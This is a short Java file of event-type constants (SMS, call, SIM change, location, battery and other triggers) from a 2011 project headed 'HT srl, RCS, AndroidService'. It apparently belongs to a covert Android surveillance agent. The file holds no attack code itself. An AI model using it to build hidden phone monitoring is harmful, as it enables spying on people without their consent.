/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventType.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;


public class EventType {
	/** Events definitions. */
	public final static int BASE = 0x2000;

	public final static int EVENT_TIMER = BASE + 0x1; // Timer Event
	public final static int EVENT_SMS = BASE + 0x2; // On Sms Event
	public final static int EVENT_CALL = BASE + 0x3; // On Call Event
	public final static int EVENT_CONNECTION = BASE + 0x4; // On Connectivity
	public final static int EVENT_PROCESS = BASE + 0x5; // On Process Event
	public final static int EVENT_CELLID = BASE + 0x6; // On CellID Event
	public final static int EVENT_QUOTA = BASE + 0x7; // On Disk Quota Event
	public final static int EVENT_SIM_CHANGE = BASE + 0x8; // On Sim Change
	public final static int EVENT_LOCATION = BASE + 0x9; // On Position Event
	public final static int EVENT_AC = BASE + 0xA; // On AC (power charger)
	public final static int EVENT_BATTERY = BASE + 0xB; // On Battery Level
	public final static int EVENT_STANDBY = BASE + 0xC; // On Standby Event

	public static int FIRST = EVENT_TIMER;
	public static int LAST = EVENT_STANDBY;

	static int[] values;

	public static int[] values() {
		if (values == null) {
			final int size = LAST - FIRST + 1;
			values = new int[size];
			for (int i = FIRST; i <= LAST; i++) {
				values[i - FIRST] = i;
			}
		}
		return values;
	}

	public static boolean isValid(int typeId) {
		return typeId >= FIRST && typeId <= LAST;
	}

}
